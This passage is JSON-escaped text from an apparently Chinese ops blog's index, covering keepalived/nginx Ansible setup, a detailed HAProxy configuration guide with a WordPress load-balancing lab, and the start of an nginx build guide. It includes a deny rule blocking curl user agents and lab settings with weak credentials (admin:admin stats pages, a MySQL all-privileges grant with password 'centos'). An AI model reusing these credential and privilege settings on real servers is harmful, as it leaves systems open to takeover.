service: name=keepalived state=restarted - name: restart nginx service: name=nginx state=restarted  准备keepalived配置文件  cat \u0026gt;\u0026gt; /app/keepalived.conf.j2 \u0026lt;\u0026lt;EOF ! Configuration File for keepalived global_defs { notification_email { root@localhost } notification_email_from keepalived@localhost smtp_server 127.0.0.1 smtp_connect_timeout 30 vrrp_iptables router_id {{ ansible_hostname }} vrrp_mcast_group4 224.0.100.19 } vrrp_script chk_down { script \u0026quot;/bin/bash -c '[[ -f /etc/keepalived/down ]]' \u0026amp;\u0026amp; exit 1 || exit 0\u0026quot; interval 1 weight -15 } vrrp_script chk_nginx { script \u0026quot;killall -0 nginx \u0026amp;\u0026amp; exit 0 || exit 1\u0026quot; interval 1 weight -15 fall 2 rise 1 } vrrp_instance VI_1 { state {{ state1 }} interface ens33 virtual_router_id 14 priority {{ priority1 }} advert_int 1 authentication { auth_type PASS auth_pass 571f87b2 } virtual_ipaddress { 192.168.1.100 } track_script { chk_down chk_nginx } notify_master \u0026quot;/etc/keepalived/notify.sh master\u0026quot; notify_backup \u0026quot;/etc/keepalived/notify.sh backup\u0026quot; notify_fault \u0026quot;/etc/keepalived/notify.sh fault\u0026quot; } vrrp_instance VI_r2 { state {{ state2 }} interface ens33 virtual_router_id 24 priority {{ priority2 }} advert_int 1 authentication { auth_type PASS auth_pass 571f97b2 } virtual_ipaddress { 192.168.1.200 } track_script { chk_down chk_nginx } notify_master \u0026quot;/etc/keepalived/notify.sh master\u0026quot; notify_backup \u0026quot;/etc/keepalived/notify.sh backup\u0026quot; notify_fault \u0026quot;/etc/keepalived/notify.sh fault\u0026quot; } EOF  notify.sh模板文件  cat \u0026gt;\u0026gt; files/notify.sh.j2 \u0026lt;\u0026lt; EOF #!/bin/bash # contact='root@localhost' notify() { local mailsubject=\u0026quot;$(hostname) to be $1, vip floating\u0026quot; local mailbody=\u0026quot;$(date +'%F %T'): vrrp transition, $(hostname) changed to be $1\u0026quot; echo \u0026quot;$mailbody\u0026quot; | mail -s \u0026quot;$mailsubject\u0026quot; $contact } case $1 in master) notify master ;; backup) notify backup ;; fault) notify fault ;; *) echo \u0026quot;Usage: $(basename $0) {master|backup|fault}\u0026quot; exit 1 ;; esac EOF  nginx反代模板配置文件  cat \u0026gt;\u0026gt; nginx.conf.j2 \u0026lt;\u0026lt; EOF user nginx; worker_processes auto; error_log /var/log/nginx/error.log; pid /run/nginx.pid; include /usr/share/nginx/modules/*.conf; events { worker_connections 1024; } http { #add upstream upstream web { server 192.168.1.38; server 192.168.1.48; } log_format main '$remote_addr - $remote_user [$time_local] \u0026quot;$request\u0026quot; ' '$status $body_bytes_sent \u0026quot;$http_referer\u0026quot; ' '\u0026quot;$http_user_agent\u0026quot; \u0026quot;$http_x_forwarded_for\u0026quot;'; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; include /etc/nginx/mime.types; default_type application/octet-stream; include /etc/nginx/conf.d/*.conf; server { listen 80 default_server; listen [::]:80 default_server; server_name _; root /usr/share/nginx/html; # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; #add proxy_pass location / { proxy_pass http://web; } error_page 404 /404.html; location = /40x.html { } error_page 500 502 503 504 /50x.html; location = /50x.html { } } }  编制nginx剧本  vim /etc/ansible/nginx.yml - hosts: nginx remote_user: root roles: - nginx  开始表演  $ansible-playbook /etc/ansible/nginx.yml PLAY [nginx] ******************************************************************* TASK [Gathering Facts] ********************************************************* ok: [192.168.1.30] ok: [192.168.1.28] TASK [nginx : install package] ************************************************* changed: [192.168.1.30] =\u0026gt; (item=[u'nginx', u'keepalived']) changed: [192.168.1.28] =\u0026gt; (item=[u'nginx', u'keepalived']) TASK [nginx : config keepalived] *********************************************** changed: [192.168.1.30] changed: [192.168.1.28] TASK [nginx : file notify.sh] ************************************************** changed: [192.168.1.30] changed: [192.168.1.28] TASK [nginx : config nginx] **************************************************** changed: [192.168.1.30] changed: [192.168.1.28] TASK [nginx : start service] *************************************************** changed: [192.168.1.28] =\u0026gt; (item=keepalived) changed: [192.168.1.30] =\u0026gt; (item=keepalived) changed: [192.168.1.28] =\u0026gt; (item=nginx) changed: [192.168.1.30] =\u0026gt; (item=nginx) RUNNING HANDLER [nginx : restart keepalived] *********************************** changed: [192.168.1.30] changed: [192.168.1.28] RUNNING HANDLER [nginx : restart nginx] **************************************** changed: [192.168.1.30] changed: [192.168.1.28] PLAY RECAP ********************************************************************* 192.168.1.28 : ok=8 changed=7 unreachable=0 failed=0 192.168.1.30 : ok=8 changed=7 unreachable=0 failed=0  在keepalive上调式   $ tcpdump -i ens33 -nn host 224.0.100.19 20:11:55.223233 IP 192.168.1.28 \u0026gt; 224.0.100.19: VRRPv2, Advertisement, vrid 24, prio 100, authtype simple, intvl 1s, length 20 20:11:55.531460 IP 192.168.1.30 \u0026gt; 224.0.100.19: VRRPv2, Advertisement, vrid 14, prio 100, authtype simple, intvl 1s, length 20 20:11:56.226411 IP 192.168.1.28 \u0026gt; 224.0.100.19: VRRPv2, Advertisement, vrid 24, prio 100, authtype simple, intvl 1s, length 20  在192.168.1.28上创建down文件,权限立马被192.168.1.30抢去，同理反之亦然。  $ touch /etc/keepalived/down $ tcpdump -i ens33 -nn host 224.0.100.19 20:12:46.765300 IP 192.168.1.30 \u0026gt; 224.0.100.19: VRRPv2, Advertisement, vrid 14, prio 100, authtype simple, intvl 1s, length 20 20:12:47.346001 IP 192.168.1.30 \u0026gt; 224.0.100.19: VRRPv2, Advertisement, vrid 24, prio 90, authtype simple, intvl 1s, length 20 20:12:47.769385 IP 192.168.1.30 \u0026gt; 224.0.100.19: VRRPv2, Advertisement, vrid 14, prio 100, authtype simple, intvl 1s, length 20 ","permalink":"https://www.fenghong.tech/blog/2018/2018-07-11-keepalive/","tags":["Linux","cluster","keepalived","ansible"],"title":"KeepAlive"},{"categories":["ops"],"contents":"摘要：\n HAproxy的介绍安装及使用 配置文件的说明及用法 ACL的配置文件选项说明 常用用法及实验  HAProxy  官网：  http://www.haproxy.org\nhttp://www.haproxy.com\n 官方文档：  http://cbonte.github.io/haproxy-dconv/\n HAProxy简介：  HAProxy is a TCP/HTTP reverse proxy which is particularly suited : for high availability environments. Indeed, it can: : - route HTTP requests depending on statically assigned cookies : - spread load among several servers while assuring server : persistence through the use of HTTP cookies : - switch to backup servers in the event a main server fails : - accept connections to special ports dedicated to service monitoring : - stop accepting connections without breaking existing ones : - add, modify, and delete HTTP headers in both directions : - block requests matching particular patterns : - report detailed status to authenticated users from a URI : intercepted by the application  反向代理的集群环境  七层反代： nginx(http, ngx_http_upstream_module), haproxy(mode http), httpd, ats, perlbal, pound... ssl/tls 会话卸载器 四层反代： lvs, nginx(stream)，haproxy(mode tcp) 数据分布: 结构化数据：mysql，50-100次/s 半结构化数据：mangodb，redis,50-100万次/s 非结构化数据：分布式存储系统  调度器  众多调度算法 事件驱动模型，单进程模型处理多应用请求 最好使用单线程  安装  $ yum install -y haproxy $ rpm -ql haproxy /etc/haproxy/haproxy.cfg\t#主配置文件 /etc/logrotate.d/haproxy\t/etc/sysconfig/haproxy\t#Uint file配置文件 /usr/bin/halog /usr/bin/iprange /usr/lib/systemd/system/haproxy.service\t#Uint file /usr/sbin/haproxy\t#主程序 Haproxy配置说明 配置文件：官网配置\n global全局配置段  配置段内容： 进程及安全配置相关的参数 性能调整相关参数 Debug参数 用户列表 peers 配置参数 进程及安全管理：chroot, daemon，user, group, uid, gid log：定义全局的syslog服务器；最多可以定义两个； log \u0026lt;address\u0026gt; [len \u0026lt;length\u0026gt;] \u0026lt;facility\u0026gt; [max level [min level]]\tnbproc \u0026lt;number\u0026gt;：要启动的haproxy的进程数量； ulimit-n \u0026lt;number\u0026gt;：每个haproxy进程可打开的最大文件数；  性能配置  maxconn \u0026lt;number\u0026gt;：设定每个haproxy进程所能接受的最大并发连接数； Sets the maximum per-process number of concurrent connections to \u0026lt;number\u0026gt;. 总体的并发连接数：nbproc * maxconn maxconnrate \u0026lt;number\u0026gt;：每个进程每秒种所能创建的最大连接数量； Sets the maximum per-process number of connections per second to \u0026lt;number\u0026gt;. maxsessrate \u0026lt;number\u0026gt;： maxsslconn \u0026lt;number\u0026gt;: 设定每个haproxy进程所能接受的ssl的最大并发连接数； Sets the maximum per-process number of concurrent SSL connections to \u0026lt;number\u0026gt;. spread-checks \u0026lt;0..50, in percent\u0026gt;  代理配置段  defaults：为frontend, listen, backend提供默认配置； fronted：前端，相当于nginx, server {} backend：后端，相当于nginx, upstream {} listen：同时拥前端和后端  代理配置端解释   A \u0026ldquo;frontend\u0026rdquo; section describes a set of listening sockets accepting client connections.\nA \u0026ldquo;backend\u0026rdquo; section describes a set of servers to which the proxy will connect to forward incoming connections.\nA \u0026ldquo;listen\u0026rdquo; section defines a complete proxy with its frontend and backend parts combined in one section. It is generally useful for TCP-only traffic.\nAll proxy names must be formed from upper and lower case letters, digits, \u0026lsquo;-\u0026rsquo; (dash), \u0026lsquo;_\u0026rsquo; (underscore) , \u0026lsquo;.\u0026rsquo; (dot) and \u0026lsquo;:\u0026rsquo; (colon). 区分字符大小写；\n  简单配置示例  frontend web bind *:80 default_backend websrvs backend websrvs balance roundrobin server srv1 192.168.1.20:80 check server srv2 192.168.1.13:80 check\t代理参数说明  bind  bind：Define one or several listening addresses and/or ports in a frontend. bind [\u0026lt;address\u0026gt;]:\u0026lt;port_range\u0026gt; [, ...] [param*] listen http_proxy bind :80,:443 bind 10.0.0.1:10080,10.0.0.1:10443 bind /var/run/ssl-frontend.sock user root mode 600 accept-proxy  balance  balance：后端服务器组内的服务器调度算法 balance \u0026lt;algorithm\u0026gt; [ \u0026lt;arguments\u0026gt; ] balance url_param \u0026lt;param\u0026gt; [check_post]\t算法： roundrobin：Each server is used in turns, according to their weights. server options： weight # 动态算法：支持权重的运行时调整，支持慢启动；每个后端中最多支持4095个server； static-rr： 静态算法：不支持权重的运行时调整及慢启动；后端主机数量无上限； leastconn： 推荐使用在具有较长会话的场景中，例如MySQL、LDAP等； first： 根据服务器在列表中的位置，自上而下进行调度； 前面服务器的连接数达到上限，新请求才会分配给下一台服务； source：源地址hash； 除权取余法： 一致性哈希： uri： 对URI的左半部分做hash计算，并由服务器总权重相除以后派发至某挑出的服务器； \u0026lt;scheme\u0026gt;://\u0026lt;user\u0026gt;:\u0026lt;password\u0026gt;@\u0026lt;host\u0026gt;:\u0026lt;port\u0026gt;/\u0026lt;path\u0026gt;;\u0026lt;params\u0026gt;?\u0026lt;query\u0026gt;#\u0026lt;frag\u0026gt; 左半部分：/\u0026lt;path\u0026gt;;\u0026lt;params\u0026gt; 整个uri：/\u0026lt;path\u0026gt;;\u0026lt;params\u0026gt;?\u0026lt;query\u0026gt;#\u0026lt;frag\u0026gt; username=jerry\turl_param： 对用户请求的uri的\u0026lt;params\u0026gt;部分中的参数的值作hash计算; 并由服务器总权重相除以后派发至某挑出的服务器； 通常用于追踪用户，以确保来自同一个用户的请求始终发往同一个Backend Server； hdr(\u0026lt;name\u0026gt;)： 对于每个http请求，此处由\u0026lt;name\u0026gt;指定的http首部将会被取出做hash计算； 并由服务器总权重相除以后派发至某挑出的服务器；没有有效值的会被轮询调度； hdr(Cookie) rdp-cookie rdp-cookie(\u0026lt;name\u0026gt;)\t log  log \u0026lt;address\u0026gt; [len \u0026lt;length\u0026gt;] \u0026lt;facility\u0026gt; [max level [min level]] [root@haproxy ~]# vim /etc/haproxy/haproxy.cfg log 127.0.0.1 local2 [root@haproxy ~]# systemctl restart haproxy [root@haproxy ~]# vim /etc/rsyslog.conf #### MODULES #### $ModLoad imudp $UDPServerRun 514 #### RULES #### # Save haproxy log to haproxy.log local2.* /var/log/haproxy.log [root@haproxy ~]# systemctl restart rsyslog  hash-type  hash-type：哈希算法 hash-type \u0026lt;method\u0026gt; \u0026lt;function\u0026gt; \u0026lt;modifier\u0026gt; map-based：除权取余法，哈希数据结构是静态的数组； consistent：一致性哈希，哈希数据结构是一个树； \u0026lt;function\u0026gt; is the hash function to be used : 哈希函数 sdbm djb2 wt6  server  server \u0026lt;name\u0026gt; \u0026lt;address\u0026gt;[:[port]] [param*] 定义后端主机的各服务器及其选项； server \u0026lt;name\u0026gt; \u0026lt;address\u0026gt;[:port] [settings ...] default-server [settings ...] \u0026lt;name\u0026gt;：服务器在haproxy上的内部名称；出现在日志及警告信息中； \u0026lt;address\u0026gt;：服务器地址，支持使用主机名； [:[port]]：端口映射；省略时，表示同bind中绑定的端口； [param*]：参数 maxconn \u0026lt;maxconn\u0026gt;：当前server的最大并发连接数； backlog \u0026lt;backlog\u0026gt;：当前server的连接数达到上限后的后援队列长度； backup：设定当前server为备用服务器； check：对当前server做健康状态检测； addr ：检测时使用的IP地址； port ：针对此端口进行检测； inter \u0026lt;delay\u0026gt;：连续两次检测之间的时间间隔，默认为2000ms; rise \u0026lt;count\u0026gt;：连续多少次检测结果为“成功”才标记服务器为可用；默认为2； fall \u0026lt;count\u0026gt;：连续多少次检测结果为“失败”才标记服务器为不可用；默认为3； 注意：option httpchk，\u0026quot;smtpchk\u0026quot;, \u0026quot;mysql-check\u0026quot;, \u0026quot;pgsql-check\u0026quot; and \u0026quot;ssl-hello-chk\u0026quot; 用于定义应用层检测方法； cookie \u0026lt;value\u0026gt;：为当前server指定其cookie值，用于实现基于cookie的会话黏性； disabled：标记为不可用； on-error \u0026lt;mode\u0026gt;：后端服务故障时的行动策略； - fastinter: force fastinter - fail-check: simulate a failed check, also forces fastinter (default) - sudden-death: simulate a pre-fatal failed health check, one more failed check will mark a server down, forces fastinter - mark-down: mark the server immediately down and force fastinter redir \u0026lt;prefix\u0026gt;：将发往此server的所有GET和HEAD类的请求重定向至指定的URL； weight \u0026lt;weight\u0026gt;：权重，默认为1;  option httpchk  option httpchk option httpchk \u0026lt;uri\u0026gt; option httpchk \u0026lt;method\u0026gt; \u0026lt;uri\u0026gt; option httpchk \u0026lt;method\u0026gt; \u0026lt;uri\u0026gt; \u0026lt;version\u0026gt; #用于定义应用层检测方法 http-check expect [!] \u0026lt;match\u0026gt; \u0026lt;pattern\u0026gt;  修改报文头部  reqadd \u0026lt;string\u0026gt; [{if | unless} \u0026lt;cond\u0026gt;] 在HTTP请求的末尾添加标头 rspadd \u0026lt;string\u0026gt; [{if | unless} \u0026lt;cond\u0026gt;] 在HTTP响应的末尾添加标头 reqdel \u0026lt;search\u0026gt; [{if | unless} \u0026lt;cond\u0026gt;] 删除与HTTP请求中的正则表达式匹配的所有标头 reqidel \u0026lt;search\u0026gt; [{if | unless} \u0026lt;cond\u0026gt;] (ignore case) rspdel \u0026lt;search\u0026gt; [{if | unless} \u0026lt;cond\u0026gt;] 删除与HTTP响应中的正则表达式匹配的所有标头 rspidel \u0026lt;search\u0026gt; [{if | unless} \u0026lt;cond\u0026gt;] (ignore case) #删除响应报文中的Server字段信息 rspidel Server.*   errorfile 和 errorloc   errorfile \u0026lt;code\u0026gt; \u0026lt;file\u0026gt; errorloc \u0026lt;code\u0026gt; \u0026lt;url\u0026gt; errorloc302 \u0026lt;code\u0026gt; \u0026lt;url\u0026gt; #code：HTTP状态代码。 目前HAProxy能够支持的代码： 200, 400, 403, 408, 500, 502, 503, and 504 #file：指定包含完整HTTP响应的文件 errorfile 400 /etc/haproxy/errorfiles/400badreq.http errorfile 408 /dev/null #解决方法Chrome预连接错误 errorfile 403 /etc/haproxy/errorfiles/403forbid.http errorfile 503 /etc/haproxy/errorfiles/503sorry.http  统计接口  统计接口启用相关的参数： stats enable 启用统计页；基于默认的参数启用stats page； - stats uri : /haproxy?stats - stats realm : \u0026quot;HAProxy Statistics\u0026quot; - stats auth : no authentication - stats scope : no restriction stats auth \u0026lt;user\u0026gt;:\u0026lt;passwd\u0026gt; 认证时的账号和密码，可使用多次； stats realm \u0026lt;realm\u0026gt; 认证时的realm； stats uri \u0026lt;prefix\u0026gt; 自定义stats page uri stats refresh \u0026lt;delay\u0026gt; 设定自动刷新时间间隔； stats admin { if | unless } \u0026lt;cond\u0026gt; 启用stats page中的管理功能 配置示例： listen stats bind :9099 stats enable stats realm HAPorxy\\ Stats\\ Page stats auth admin:admin stats admin if TRUE\tACL 访问控制列表的使用提供了一种灵活的解决方案来执行内容切换，并且通常基于从请求，响应或任何环境状态中提取的内容来做出决策\nacl \u0026lt;aclname\u0026gt; \u0026lt;criterion\u0026gt; [flags] [operator] [\u0026lt;value\u0026gt;] ...  aclname：ACL名称必须由大写和小写字母，数字，’ – ‘（短划线），’_’（下划线），’.’ 组成。ACL名称区分大小写 value：值  boolean 布尔型 integer or integer range 整数或整数范围 IP address / network IP或网络地址 string (exact精确匹配, substring子串匹配, suffix前缀匹配, prefix后缀匹配, subdir子路径匹配, domain子域名匹配) 字符串匹配 regular expression 正则表示式匹配 hex block 16进制的块匹配  flags：标志  -i : 忽略字符大小写 -m : 特定的模式 -n : 禁止DNS解析 -u : 要求acl使用唯一的名称  operator：操作符  匹配整数值：eq、ge、gt、le、lt 匹配字符串： exact match 精确匹配 substring match 子串匹配 prefix match 前缀匹配 suffix match 后缀匹配 subdir match 子路径匹配 domain match 子域名匹配  acl作为条件时的逻辑关系：  if invalid_src invalid_port 或关系 if invalid_src || invalid_port 与关系 if ! invalid_src invalid_port 非invalid_src  检查URL的路径  path : 精确匹配 path_beg : 前缀匹配 path_dir : 子串匹配 path_dom : 子域名匹配 path_end : 路径后缀匹配 path_len : 路径长度匹配 path_reg : 路径的正则表达式模式匹配 path_sub : 路径的子字串匹配  整个URL检查  url : 精确匹配 url_beg : 前缀匹配 url_dir : 子串匹配 url_dom : 子域名匹配 url_end : 后缀匹配 url_len : 长度匹配 url_reg : 正则表达式匹配 url_sub : 子字串匹配  请求报文的指定头部检查  req.hdr([\u0026lt;name\u0026gt;[,\u0026lt;occ\u0026gt;]]) : string This extracts the last occurrence of header \u0026lt;name\u0026gt; in an HTTP request. hdr([\u0026lt;name\u0026gt;[,\u0026lt;occ\u0026gt;]]) : exact string match hdr_beg([\u0026lt;name\u0026gt;[,\u0026lt;occ\u0026gt;]]) : prefix match hdr_dir([\u0026lt;name\u0026gt;[,\u0026lt;occ\u0026gt;]]) : subdir match hdr_dom([\u0026lt;name\u0026gt;[,\u0026lt;occ\u0026gt;]]) : domain match hdr_end([\u0026lt;name\u0026gt;[,\u0026lt;occ\u0026gt;]]) : suffix match hdr_len([\u0026lt;name\u0026gt;[,\u0026lt;occ\u0026gt;]]) : length match hdr_reg([\u0026lt;name\u0026gt;[,\u0026lt;occ\u0026gt;]]) : regex match hdr_sub([\u0026lt;name\u0026gt;[,\u0026lt;occ\u0026gt;]]) : substring match\t示例： acl bad_curl hdr_sub(User-Agent) -i curl block if bad_curl  示例：阻止curl访问  frontend web *:80 acl bad_curl hdr_sub(User-Agent) -i curl block if bad_curl default_backend appsrvs  示例:   配置简单的动静分离  $ cp /etc/haproxy/haproxy.cfg{.bak} $ vim /etc/haproxy/haproxy.cfg global log 127.0.0.1 local2 ··· frontend main *:80 mode http default_backend websrvs backend websrvs balance roundrobin server websrv1 192.168.1.20:80 check server websrv2 192.168.1.8:80 check apache服务的搭建  ~]#yum install -y httpd ~]#echo srv1 \u0026gt; /var/www/html/index.html ~]#systemctl start httpd ~]#yum install -y httpd ~]#echo srv2 \u0026gt; /var/www/html/index.html ~]#systemctl start httpd 测试均衡调度  ~]#for i in {1..10};do curl 192.168.1.18;done srv1 srv2 srv1 srv2 srv1 srv2 srv1 srv2 srv1 srv2 实验wordpress的负载均衡 需求：\nhttp: (1) 动静分离部署wordpress，动静都要能实现负载均衡，要注意会话的问题； (2) 给出设计拓扑，写成博客；\t(3) haproxy的设定要求： (a) stats page，要求仅能通过本地访问使用管理接口； (b) 动静分离； (c) 分别考虑不同的服务器组的调度算法； (d) 压缩合适的内容类型；  首先，在192.168.1.8/24上实现lamp架构  1. 安装必要的软件 ]# yum install -y mariadb-server httpd php-fpm php-mysql ]# wget https://cn.wordpress.org/wordpress-4.9.4-zh_CN.tar.gz ]# tar xf wordpress-4.9.4-zh_CN.tar.gz -C /var/www/html ]# chown -R apache.apache /var/www/html/* ]# cd /var/www/html/ ]# cp wp-config-sample.php wp-config.php ]# vim wp-config.php define('DB_NAME', 'wpdb'); /** MySQL数据库用户名 */ define('DB_USER', 'test'); /** MySQL数据库密码 */ define('DB_PASSWORD', 'centos'); /** MySQL主机 */ define('DB_HOST', '127.0.0.1'); 2. 修改http配置文件 ]# vim /etc/httpd/conf.d/fcgi.conf DirectoryIndex index.php ProxyRequests Off ProxyPassMatch ^/(.*\\.php)$ fcgi://127.0.0.1:9000/var/www/html/$1 3. 授权mysql账户 ]# systemctl start mariadb httpd ]# mysql -e \u0026quot;grant all on *.* to test@'192.168.1.%' identified by 'centos'\u0026quot; ]# mysql -e 'flush privileges' 4. 启动服务 ]# systemctl start httpd ]# systemctl start php-fpm ]# systemctl start mariadb 5. 测试动静分离，停止服务，依旧能访问另一他台服务器的静态资源 ]# systemctl stop httpd  其次，在192.168.1.20/24上实现静态资源  $ yum install -y httpd $ wget https://cn.wordpress.org/wordpress-4.9.4-zh_CN.tar.gz $ tar xf wordpress-4.9.4-zh_CN.tar.gz -C /var/www/html $ chown -R apache.apache /var/www/html/*  最后，在haproxy服务器上配置动静分离  $ yum install -y haproaxy $ cp /etc/haproxy/haproxy.cfg{,.bak} $ vim /etc/haproxy/haproxy.cfg ··· frontend main *:80 mode http acl url_static path_beg -i /static /images /javascript /stylesheets acl url_static path_end -i .jpg .gif .png .css .js .html .txt .htm use_backend staticsrvs if url_static default_backend phpsrvs backend staticsrvs balance roundrobin #option httpchk GET /test1.html #cookie WEBSRV insert nocache indirect #server websrv1 192.168.1.20:80 weight 2 check cookie websrv1 #server websrv2 192.168.1.8:80 weight 1 check cookie websrv2 server websrv2 192.168.1.8:80 check backend phpsrvs balance roundrobin server websrv1 192.168.1.20:80 check listen stats bind 127.0.0.1:80 stats enable stats uri /admin?stats stats realm HAProxy\\ Stats stats auth admin:admin stats admin if TRUE 常用功能实现  压缩  frontend web *:80 default_backend appsrvs compression algo gzip compression type text/html text/plain backend appsrvs balance roundrobin server app1 192.168.0.10:80 check server app2 192.168.0.11:80 check stats page  listen stats bind :8080 stats realm \u0026quot;HAProxy Stats Page\u0026quot; stats auth admin:adminpass #认证用户：密码 stats admin if TRUE 访问：http://192.168.0.8:8080/haproxy?stats进入状态管理页 自定义错误页  [root@haproxy ~]# vim /etc/haproxy/haproxy.cfg frontend web *:80 default_backend appsrvs acl bad_guy src 192.168.0.7 block if bad_guy errorfile 403 /etc/haproxy/errorfiles/403forbid.http backend appsrvs balance roundrobin server app1 192.168.0.10:80 check server app2 192.168.0.11:80 check [root@haproxy ~]# mkdir /etc/haproxy/errorfiles/ -p [root@haproxy ~]# echo 'forbid' \u0026gt;/etc/haproxy/errorfiles/403forbid.http [root@haproxy ~]# systemctl restart haproxy [root@client ~]# curl http://192.168.0.8/ forbid 访问控制  listen stats bind :8080 stats realm \u0026quot;HAProxy Stats Page\u0026quot; stats auth admin:adminpass stats admin if TRUE acl admin_client src 192.168.0.254 block unless admin_client #只允许192.168.0.254访问状态管理页 日志功能  调度器中配置 [root@haproxy ~]# vim /etc/haproxy/haproxy.cfg backend appsrvs balance roundrobin option forwardfor server app1 192.168.0.10:80 check server app2 192.168.0.11:80 check [root@haproxy haproxy]# systemctl restart haproxy.service 后端服务器配置（Apache） [root@web2 ~]# vim /etc/httpd/conf/httpd.conf LogFormat \u0026quot;%{X-Forwarded-For}i %l %u %t \\\u0026quot;%r\\\u0026quot; %\u0026gt;s %b \\\u0026quot;%{Referer}i\\\u0026quot; \\\u0026quot;%{User-Agent }i\\\u0026quot;\u0026quot; combined #改变日志记录方式 [root@web2 ~]# systemctl restart httpd [root@web2 ~]# tail -f /var/log/httpd/access_log 基于cookie的session粘滞  [root@haproxy ~]# vim /etc/haproxy/haproxy.cfg frontend web *:80 mode http default_backend appsrvs backend appsrvs balance roundrobin option forwardfor cookie WEBSRV insert nocache indirect server app1 192.168.0.10:80 check inter 1000 rise 1 fall 2 maxconn 2000 cookie websrv1 server app2 192.168.0.11:80 check maxconn 1500 cookie websrv2 [root@client ~]# curl -b \u0026quot;WEBSRV=websrv1\u0026quot; http://192.168.0.8/ web1 [root@client ~]# curl -b \u0026quot;WEBSRV=websrv2\u0026quot; http://192.168.0.8/ web2 后端主机的健康状态检测  backend appsrvs balance roundrobin option httpchk GET /test.html server app1 192.168.0.10:80 check server app2 192.168.0.11:80 check 请求和响应报文首部的操纵：替换响应报文的Server字段信息  [root@haproxy ~]# vim /etc/haproxy/haproxy.cfg frontend web *:80 mode http rspidel ^Server:.* rspadd Server:\\ Apache\\ or\\ Nginx default_backend appsrvs [root@client ~]# curl -I http://192.168.0.8/ Server: Apache or Nginx #掩人耳目 ","permalink":"https://www.fenghong.tech/blog/2018/2018-07-09-haproxy/","tags":["Linux","internet","haproxy"],"title":"HAProxy"},{"categories":["ops"],"contents":"摘要：\n Nginx简介 源码编译安装Nginx Nginx服务器性能优化 Nginx模块介绍  Nginx简介 ​\tNginx（发音同engine x）是一个异步框架的 Web服务器，也可以用作反向代理，负载平衡器 和 HTTP缓存。该软件由 Igor Sysoev 创建，并于2004年首次公开发布。同名公司成立于2011年，以提供支持。\nNGINX是免费，开源，高性能的HTTP和反向代理服务器，邮件代理服务器，通用TCP/UDP代理服务器\nNginx在官方测试的结果中，能够支持五万个并行连接，而在实际的运作中，可以支持二万至四万个并行连接。\nNginx 的编写有一个明确目标就是超越 Apache Web 服务器的性能。Nginx 提供开箱即用的静态文件，使用的内存比 Apache 少得多，每秒可以处理大约四倍于 Apache 的请求。低并发下性能与 Apache 相当，有时候还低于，但是在高并发下 Nginx 能保持低资源低消耗高性能。还有高度模块化的设计，模块编写简单。配置文件简洁。\n官网：http://nginx.org\n文档：https://nginx.org/en/docs/\n特性：\n 模块化设计，较好的扩展性 高可靠性 支持热部署：不停机更新配置文件、升级版本、更换日志文件 低内存消耗：10000个keep-alive连接模式下的非活动连接，仅需2.5M内存 event-driven（事件驱动）、aio（异步IO）、mmap（内存映射）、sendfile  功能：\n 静态资源的web服务器，html，图片，js，css，txt等静态资源 http协议反向代理服务器 pop3/imap4协议反向代理服务器 FastCGI(LNMP)、uWSGI(python)等协议 模块化（非DSO），如zip、SSL模块  web服务功能：\n 虚拟主机（server） 支持 keep-alive 和管道连接 访问日志（支持基于日志缓冲提高其性能） url重写（rewirte） 路径别名 基于IP及用户的访问控制 支持速率限制及并发数限制 重新配置和在线升级而无须中断客户的工作进程 Memcached 的 GET 接口  nginx的安装 yum源安装 官方源：http://nginx.org/packages/centos/7/x86_64/\nepel源：https://mirrors.aliyun.com/epel/7/x86_64/\n安装：yum install nginx -y\n默认主站点目录：/usr/share/nginx/html\n主程序：/usr/sbin/nginx\n# nginx 启动服务 # nginx -v|-V 查看版本 # nginx -t 检查配置文件 # nginx -c filename 指定配置文件(default: /etc/nginx/nginx.conf) # nginx -s signal 发送信号给master进程，signal：stop, quit, reopen, reload # nginx -g directives 在命令行中指明全局指令 主配文件：/etc/nginx/nginx.conf\n子配文件：/etc/nginx/conf.d/*\n配置文件格式：\nmain block：主配置段，即全局配置段，对http,mail都有效 event { ... } 事件驱动相关的配置 http { ... } http/https 协议相关配置段 mail { ... } mail 协议相关配置段 stream { ... } stream 服务器相关配置段 默认配置文件示例：\nhttp { log_format main '$remote_addr - $remote_user [$time_local] \u0026quot;$request\u0026quot; ' '$status $body_bytes_sent \u0026quot;$http_referer\u0026quot; ' '\u0026quot;$http_user_agent\u0026quot; \u0026quot;$http_x_forwarded_for\u0026quot;'; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; include /etc/nginx/mime.types; default_type application/octet-stream; include /etc/nginx/conf.d/*.conf; server { listen 80 default_server; listen [::]:80 default_server; server_name _; root /usr/share/nginx/html; include /etc/nginx/default.d/*.conf; location / { } error_page 404 /404.html; location = /40x.html { } error_page 500 502 503 504 /50x.html; location = /50x.html { } } } 编译安装 [root@centos7 ~]# yum install pcre-devel openssl-devel zlib-devel -y [root@centos7 ~]# useradd -r -s /sbin/nologin nginx [root@centos7 ~]# wget https://nginx.org/download/nginx-1.14.0.tar.gz [root@centos7 ~]# tar xf nginx-1.14.0.tar.gz [root@centos7 ~]# cd nginx-1.14.0/ [root@centos7 nginx-1.14.0]# vim src/http/ngx_http_header_filter_module.c static u_char ngx_http_server_string[] = \u0026quot;Server: feijikesi\u0026quot; CRLF; [root@centos7 nginx-1.14.0]# vim src/core/nginx.h #define NGINX_VERSION \u0026quot;6.6.6\u0026quot;\t#Server_tokens 显示的版本号 #define NGINX_VER \u0026quot;honginx/\u0026quot; NGINX_VERSION\t#Server_tokens 显示的服务名称 [root@centos7 nginx-1.14.0]# ./configure --prefix=/usr/local/nginx \\ \u0026gt; --conf-path=/etc/nginx/nginx.conf \\ \u0026gt; --error-log-path=/var/log/nginx/error.log \\ \u0026gt; --http-log-path=/var/log/nginx/access.log \\ \u0026gt; --pid-path=/var/run/nginx.pid \\ \u0026gt; --lock-path=/var/run/nginx.lock \\ \u0026gt; --user=nginx \\ \u0026gt; --group=nginx \\ \u0026gt; --with-http_ssl_module \\ \u0026gt; --with-http_v2_module \\ \u0026gt; --with-http_dav_module \\ \u0026gt; --with-http_stub_status_module \\ \u0026gt; --with-threads \\ \u0026gt; --with-file-aio [root@centos7 nginx-1.14.0]# make \u0026amp;\u0026amp; make install [root@centos7 ~]# echo 'PATH=/usr/local/nginx/sbin/:$PATH' \u0026gt; /etc/profile.d/nginx.sh [root@centos7 ~]# . /etc/profile.d/nginx.sh [root@centos7 